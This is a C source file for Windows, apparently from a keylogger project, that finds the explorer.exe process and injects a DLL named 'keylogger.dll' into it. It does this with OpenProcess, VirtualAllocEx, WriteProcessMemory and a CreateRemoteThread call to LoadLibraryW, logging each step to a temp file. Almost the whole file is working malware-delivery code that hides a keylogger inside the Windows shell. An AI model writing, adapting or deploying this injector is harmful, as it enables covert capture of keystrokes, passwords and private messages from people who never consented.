#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors
#pragma warning(disable:4820) // Padding added after data member, this warning cant be removed
#pragma warning(disable:4191) // 'type cast' : unsafe conversion from 'type1' to 'type2', this warning cant be removed

#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>

void	write_logs(char *str, HANDLE fd)
{
	if (fd == NULL)
		return ;
	DWORD bytesWritten;
	WriteFile(fd, str, (DWORD)strlen(str), &bytesWritten, NULL);
}

HANDLE	create_log_file(void)
{
	HANDLE fd = NULL;
	wchar_t tmpPath[MAX_PATH];
	GetTempPathW(MAX_PATH, tmpPath);
	wcscat_s(tmpPath, MAX_PATH, L"logs_tw_prgm.txt");

	fd = CreateFileW(tmpPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (fd != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(fd, 0, NULL, FILE_END);
		return fd;
	}
	return NULL;
}

DWORD FindTargetPID(const wchar_t* targetName)
{
	// Create a snapshot of all processes in the system
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);

	// Take a snapshot of the processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	// Iterate through the processes in the snapshot
	if (Process32FirstW(snapshot, &pe))
	{
		do
		{
			// Compare the process name with the target name
			if (wcscmp(pe.szExeFile, targetName) == 0)
			{
				// Found the target process, return its PID
				CloseHandle(snapshot);
				return pe.th32ProcessID;
			}
		} while (Process32NextW(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return 0;
}

int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nShowCmd;
	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
	const wchar_t* targetProcess = L"explorer.exe";

	HANDLE fd = create_log_file();
	if (fd == NULL)
		return 1;

	// Find the target process ID
	DWORD pid = FindTargetPID(targetProcess);
	if (pid == 0)
	{
		write_logs("Target process not found.\n", fd);
		return 1;
	}

	// Open the target process with all access rights
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
	{
		write_logs("Failed to open target process.\n", fd);
		return 1;
	}

	// Allocate memory in the target process for the DLL path
	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMem)
	{
		write_logs("Failed to allocate memory in target process.\n", fd);
		CloseHandle(hProcess);
		return 1;
	}

	// Write the DLL path to the allocated memory
	if (!WriteProcessMemory(hProcess, remoteMem, (LPVOID)dllPath, dllPathSize, NULL))
	{
		write_logs("Failed to write DLL path to target process memory.\n", fd);
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	// Create a remote thread in the target process to load the DLL

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);

		if (!hThread)
		{
			write_logs("Failed to create remote thread in target process.\n", fd);
			VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
			CloseHandle(hProcess);
			return 1;
		}

	// Wait for the remote thread to finish and clean up
	write_logs("DLL injected successfully.\n", fd);
	CloseHandle(fd); // Close the log file handle before creating a remote thread
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return 0;
}
